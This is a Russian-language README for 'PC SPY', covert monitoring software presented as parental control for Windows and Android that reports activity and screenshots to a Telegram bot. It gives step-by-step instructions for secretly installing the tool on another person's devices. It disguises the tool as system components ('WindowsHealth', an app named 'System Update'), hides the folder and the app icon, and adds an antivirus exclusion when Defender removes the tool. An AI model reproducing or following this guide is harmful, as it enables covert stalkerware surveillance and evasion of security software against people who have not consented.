# 🕵️ PC SPY: Подробное Руководство

Система родительского контроля и мониторинга для Windows и Android.

## 🤖 Часть 1. Создание своего Telegram-бота (Обязательно)

Чтобы получать отчеты, вам нужно создать "Личного бота". Это бесплатно и занимает 2 минуты.

1.  Откройте Telegram и в поиске найдите **@BotFather** (у него синяя галочка).
2.  Нажмите кнопку `Start` (или напишите `/start`).
3.  Отправьте команду `/newbot`.
4.  Придумайте **Имя бота** (любое, например `MyParentControl`).
5.  Придумайте **Юзернейм** (должен заканчиваться на `bot`, например `MyFamilySpy_bot`).
6.  В ответ BotFather пришлет длинный код — это ваш **TOKEN**.
    *   Пример: `798453456:AAHdqTcn...`
    *   **Сохраните его!**

7.  Теперь узнайте **Ваш личный ID**:
    *   Найдите бота **@userinfobot**.
    *   Нажмите `Start`.
    *   Он пришлет число (например `12345678`).
    *   **Сохраните его!**

## 🖥️ Часть 2. Windows (Установка)

**Файл:** `spy_release_final\Install_Spy.exe`

### Инструкция:
1.  Скопируйте `Install_Spy.exe` на компьютер ребенка.
2.  Запустите файл.
3.  Появится окно настройки.
    *   **Шаг 1:** Введите **TOKEN** бота (из Части 1).
    *   **Шаг 2:** Введите **Ваш ID** (из Части 1).
4.  Нажмите OK. Программа скажет "Success" и исчезнет.

### Проверка:
Напишите своему новому боту команду `/status`. Если интернет есть, он ответит.

### Доступные команды:
*   `/status` — Текущая активность.
*   `/report` — Отчет за день.
*   `/msg <текст>` — Вывести сообщение на весь экран. Пример: `/msg Иди спать!`
*   `/screen` — **(Новое)** Получить скриншот экрана.
*   `/block <site>` — **(Новое)** Заблокировать сайт. Пример: `/block youtube.com`.
    *   *Требует запуска от имени Администратора.*
*   `/unblock <site>` — **(Новое)** Разблокировать сайт.

### Важно: Скрытый режим
После установки папка `WindowsHealth` станет **скрытой и системной**. Вы не увидите её в проводнике, даже если включите "Показывать скрытые файлы". Это защита от случайного обнаружения.

Чтобы найти её вручную, введите в адресной строке проводника: `%APPDATA%\WindowsHealth` и нажмите Enter.

## 📱 Часть 3. Android (Сборка и Установка)

Т.к. это шпионское ПО, вы не можете скачать его из Play Store. Вам нужно собрать его самостоятельно (это тоже просто).

### 1. Подготовка
1.  Скачайте и установите **Android Studio** (бесплатно с developer.android.com).
2.  Запустите Android Studio и создайте **New Project**.
    *   Выберите **Empty Views Activity**.
    *   Name: `System Update`
    *   Package name: `com.android.sysutils`
    *   Language: **Kotlin**
    *   Minimum SDK: **API 26**
    *   Нажмите Finish.

### 2. Копирование кода
В папке `android_spy` есть все нужные файлы. Замените их в проекте Android Studio:

1.  **AndroidManifest.xml**:
    *   Откройте `app/src/main/AndroidManifest.xml` в Android Studio.
    *   Удалите всё и вставьте код из моего файла `android_spy/app/src/main/AndroidManifest.xml`.
2.  **MainActivity.kt**:
    *   Откройте `app/src/main/java/com/android/sysutils/MainActivity.kt`.
    *   Вставьте код из `android_spy/.../MainActivity.kt`.
3.  **MonitorService.kt**:
    *   Создайте новый Kotlin файл (ПКМ на папке `com.android.sysutils` -> New -> Kotlin Class/File -> Name: `MonitorService`).
    *   Вставьте код из `android_spy/.../MonitorService.kt`.
4.  **BootReceiver.kt**:
    *   Создайте файл `BootReceiver`.
    *   Вставьте код из `android_spy/.../BootReceiver.kt`.

### 3. Сборка APK
1.  В меню сверху: **Build** -> **Build Bundle(s) / APK(s)** -> **Build APK**.
2.  Через минуту справа внизу появится уведомление "APK generated". Нажмите **locate**.
3.  Файл `app-debug.apk` — это и есть ваша программа.
4.  Перекиньте его на телефон ребенка.

### 4. Настройка на телефоне
1.  Установите APK.
2.  Откройте приложение "System Update".
3.  Введите **TOKEN** бота и **Ваш ID**.
4.  Нажмите **Grant Usage Access** (разрешите доступ в настройках).
5.  Нажмите **Save & Start**.
6.  Нажмите **Hide Icon**.

## ❓ Решение проблем

**Антивирус удаляет файл на Windows?**
Добавьте папку `%APPDATA%\WindowsHealth` в исключения Защитника Windows (см. в настройках "Защита от вирусов -> Исключения").

**Бот молчит?**
1. Проверьте, нажали ли вы `/start` в своем боте.
2. Проверьте интернет на устройстве ребенка.
